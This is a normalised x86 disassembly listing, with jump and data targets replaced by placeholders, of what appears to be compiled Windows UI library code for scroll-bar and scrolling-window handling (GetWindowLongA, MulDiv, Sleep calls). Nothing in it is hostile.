mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x40 ]
add edx [ ebx + 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a4e0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x48 ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_457444
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov al [ ebx + 0x5b ]
sub al 0x2
jb r-xdata
cmp [ ebx + 0x5b ] 0x1
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax + 0xc ]
add edx [ ebx + 0x44 ]
add edx [ ebx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42a4e0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov al [ r-xdata ]
and al [ ebx + 0x61 ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x4c ]
add [ eax - 0xc ] edx
jmp r-xdata
sub_4574ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x210 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_457be0
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_4438dc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x1a ]
add edx eax
mov eax [ ebp - 0x8 ]
call sub_457be0
jmp r-xdata
inc ebx
xor esi esi
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4438a0
call sub_457444
pop ecx
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_4438a0
call sub_4573d8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
inc esi
dec ebx
jne r-xdata
sub_457558
push ebx
push esi
mov ebx eax
mov esi 0x100000
cmp [ ebx + 0x18 ] 0x1
jne r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
mov esi 0x200000
xor eax eax
pop esi
pop ebx
retn
push 0xfffffff0
mov eax [ ebx + 0x4 ]
call sub_446be4
push eax
call GetWindowLongA
test eax esi
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_457590
push ebp
mov ebp esp
push ebx
mov ebx 0x100000
cmp ax 0x1
jne r-xdata
push 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
call GetWindowLongA
test eax ebx
setne al
pop ebx
pop ebp
retn
mov ebx 0x200000
sub_4575c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x6 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_457590
pop ecx
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_457590
pop ecx
test al al
je r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
neg ebx
jmp r-xdata
movzx eax di
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebp + 0x8 ]
sub ebx [ eax - 0xc ]
sub_457640
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push 0xfffffff0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
call GetWindowLongA
test eax 0x840000
setne al
and eax 0x7f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
push ebp
mov dx 0x14
mov ax 0x1
call sub_4575c4
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43fdc8
add ebx eax
mov eax ebx
push ebp
mov dx 0x15
xor eax eax
call sub_4575c4
pop ecx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43fe0c
add ebx eax
mov eax ebx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4576d8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
mov [ ebp - 0x1c ] 0x1c
mov [ ebp - 0x18 ] 0x10
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
movsx esi [ esi + 0x6 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
je r-xdata
mov ebx 0x1
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp - 0x4 ]
sub_457738
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
movsx eax [ eax + 0x4 ]
cmp eax 0x7
ja r-xdata
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x4
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_457909 ]
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x2
jb r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
add edx eax
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457640
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
sub edx eax
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_457640
mov edx eax
mov eax [ ebp - 0x4 ]
add edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
mov eax [ ebp - 0x4 ]
movzx ebx [ eax + 0x8 ]
mov eax ebx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x40 ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax ebx
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov esi ecx
jmp r-xdata
sub ax 0x2
jb r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
push ebp
call sub_4576d8
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x7fff
jle r-xdata
xor edi edi
test esi esi
jle r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov esi ecx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x8 ]
movsx edx [ edx + 0x6 ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
push ebp
call sub_4576d8
pop ecx
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jle r-xdata
call sub_406cf0
mov ebx eax
mov eax ebx
sub eax edi
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x20 ]
cmp eax edx
jge r-xdata
xor esi esi
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
mov edi ebx
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x4 ]
sub ax 0x1
jb r-xdata
sub edx eax
push edx
call Sleep
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
dec esi
test esi esi
jg r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
dec ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_457aa8
jmp r-xdata
sub_457a30
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x24 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_458120
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x24 ] eax
sub_457aa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebx + 0x14 ]
cmp edx eax
jle r-xdata
mov [ ebx + 0xc ] edx
jmp r-xdata
test edx edx
jge r-xdata
mov edx eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
xor edx edx
mov si 0x1
xor esi esi
jmp r-xdata
movzx edi si
push edi
mov eax [ ebx + 0x4 ]
call sub_446be4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax [ ebx + 0xc ]
je r-xdata
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
cmp edx eax
je r-xdata
push 0xffffffff
mov eax [ ebx + 0xc ]
push eax
push edi
mov eax [ ebx + 0x4 ]
call sub_446be4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ecx eax
sub ecx edx
mov eax [ ebx + 0x4 ]
xor edx edx
call sub_446764
sub eax edx
mov edx eax
xor ecx ecx
mov eax [ ebx + 0x4 ]
call sub_446764
jmp r-xdata
call sub_457218
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_457b6c
push ebx
push esi
mov ebx eax
cmp edx [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov esi edx
test esi esi
jne r-xdata
mov [ ebx + 0x30 ] edx
mov [ ebx + 0x44 ] 0x1
mov eax [ ebx + 0x4 ]
call sub_458120
test esi esi
jne r-xdata
xor eax eax
mov al [ ebx + 0x18 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
xor eax eax
mov [ ebx + 0x30 ] eax
sub_457c24
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
cmp bl 0x1
cmc
sbb eax eax
push eax
mov eax [ esi ]
movzx eax [ eax + 0x34 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
call sub_42c100
mov eax [ esi ]
cmp [ eax + 0x24 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp [ eax + 0x38 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
call sub_42c100
mov eax [ esi ]
cmp [ eax + 0x30 ] 0x0
jle r-xdata
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
call sub_42c100
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x28 ]
call sub_422a94
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
call sub_42c100
pop esi
pop ebx
pop ebp
retn
push 0x0
mov eax [ esi ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ esi ]
movzx eax [ eax + 0x18 ]
lea eax [ eax + eax * 4 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
call sub_42c100
sub_457d2c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
lea esi [ ebp - 0x4 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
xor ebx ebx
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov bx 0x1
mov [ ebp - 0x22 ] 0x1c
mov [ ebp - 0x1e ] 0x17
xor eax eax
mov [ ebp - 0x1a ] eax
mov eax [ esi ]
cmp [ eax + 0x14 ] 0x0
jle r-xdata
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_457640
mov edx [ esi ]
mov edi [ edx + 0x10 ]
sub edi eax
mov eax [ esi ]
mov [ eax + 0x14 ] edi
test edi edi
jge r-xdata
xor eax eax
mov [ ebp - 0x16 ] eax
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov [ ebp - 0x16 ] eax
jmp r-xdata
mov eax [ esi ]
xor edx edx
mov [ eax + 0x14 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
movzx eax bx
mov ecx 0xa
xor edx edx
div ecx
mov edx [ esi ]
mov [ edx + 0x8 ] ax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ esi ]
call sub_457640
inc eax
mov [ ebp - 0x12 ] eax
mov eax [ esi ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xe ] eax
mov [ ebp - 0xa ] eax
push ebp
mov eax [ esi ]
mov al [ eax + 0x44 ]
call sub_457c24
pop ecx
mov eax [ esi ]
mov [ eax + 0x44 ] 0x0
push 0xffffffff
lea eax [ ebp - 0x22 ]
push eax
movzx eax bx
push eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
call sub_446be4
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov eax [ esi ]
call sub_457aa8
xor ecx ecx
mov dl 0x1
mov eax [ esi ]
call sub_457640
lea eax [ eax + eax * 8 ]
mov ecx 0xa
cdq
idiv ecx
mov ebx eax
mov eax [ esi ]
mov [ eax + 0xa ] bx
mov eax [ esi ]
cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_457e44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4428d8
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4572c0
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4572c0
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_457ebc
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_40324c
mov eax [ esi + 0x20c ]
call sub_40324c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4429fc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_457f08
push ebx
mov ebx eax
mov eax ebx
call sub_443b64
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_458120
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c1b0
test al al
jne r-xdata
mov eax ebx
call sub_446be4
push eax
call sub_42c134
sub_457f48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4580a0
mov ecx edi
mov edx esi
mov eax ebx
call sub_4432ac
pop edi
pop esi
pop ebx
retn
sub_457f86
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_458090
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43fdc8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_457558
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_4438dc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_457aa8
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4438a0
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41a0dc
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43fb34
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458097
mov eax [ ebp - 0x10 ]
call sub_40324c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4573a0
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_41a238
xor ecx ecx
mov edx 0xb03e
call sub_441578
inc ebx
dec esi
jne r-xdata
sub_4580c4
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_457bf8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_457bf8
mov eax ebx
call sub_4580a0
jmp r-xdata
sub_458120
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_446ee8
test al al
je r-xdata
xor eax eax
push ebp
push sub_45820b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4576c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4576c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_457d2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_457d2c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_457d2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_457d2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_457d2c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_457d2c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_458230
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43fedc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43ff08
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43fedc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43ff08
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43fdc8
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_457aa8
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_43fdc8
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_43fe0c
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_457aa8
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_43fdc8
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_457aa8
mov eax ebx
call sub_43fdc8
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_43fe0c
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_43fe0c
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_457aa8
mov eax ebx
call sub_43fe0c
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_458384
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_457aa8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_457aa8
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_457bf8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_457bf8
sub_458428
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_458384
mov ecx edi
mov edx esi
mov eax ebx
call sub_4466b8
pop edi
pop esi
pop ebx
retn
sub_458450
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_4584ba
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445198
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4584c1
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_4584c1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4584f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4580a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458500
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_458500
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
